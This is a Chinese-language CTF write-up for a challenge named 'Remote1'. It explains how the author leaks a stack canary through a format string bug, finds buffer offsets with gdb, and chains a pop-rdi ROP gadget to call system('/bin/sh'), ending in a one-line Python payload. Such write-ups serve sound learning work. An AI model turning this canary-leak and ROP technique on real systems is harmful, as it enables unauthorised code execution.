Remote1
==========
這算是我第一次參加CTF比賽第一道解出來，也是唯一在時間內解出來的題目XD。

解題流程
----------
題目一執行就說是 echo service，除了 quit，輸入什麼就輸出什麼。但當我們輸入像這樣的東西：
	
	Welcome to the simple echo service

	[type 'quit' to quit] prompt> %lx
	40095f
就知道存在 format string 的漏洞。另外若是輸入達一定的長度，quit 離開時會出現 **stack smashing detected** 的警告，代表同時存在 buffer overflow 的漏洞，但有開啟 stack canary 進行保護。

所以想法是：先 leak 出 stack canary 在 stack 上存的的值，再 overflow 到 return address，利用程式自帶的 ```system``` 函式和 ```"/bin/sh"``` 字串開 shell。

首先確認第幾個參數開始是我們可以控制的

	Welcome to the simple echo service

	[type 'quit' to quit] prompt> AAAAAAAA%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx
	AAAAAAAA40095f 0 71 7f7ef559a700 1e 23 30f5395620 4141414141414141 20786c2520786c25 20786c2520786c25
	
可以得知第 8 個參數開始是我們可控的內容。接下來確認一下 stack canary 存的變數的位址

	4007aa:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
	4007b1:       00 00
	4007b3:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax

發現是放在 rbp-0x8 的地方。再來可以透過 gdb 觀察 buffer 和這個位址的偏移

	(gdb) p $rbp
	$1 = (void *) 0x7fffffffe350
	(gdb) x/8gx $rsp
	0x7fffffffe320: 0x0000000000000023      0x00007ffff7dd4620
	0x7fffffffe330: 0x4141414141414141      0x00007ffff7a9f90a
	0x7fffffffe340: 0x0000000000000000      0xfc9c8b7ab91cc800
	0x7fffffffe350: 0x00007fffffffe360      0x000000000040088a
	
因此我們可以從第 8+3=11 個參數得到該變數。

接著要進行 overflow 時，將剛剛 leak 出的值蓋在原來的位置上，如此一來便能夠通過 **__stack_chk_fail** 的檢查，成功蓋到 retuen address 而不會被擋下來。
利用 ROPgadget，可以找到 ```pop rdi ; ret``` 這個 gadget。透過他，我們就可以構造 **system("/bin/sh")** 這個 function call 來取得 shell。

```python
payload = 'A'*24 + p64(canary) + 'B'*8 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
```
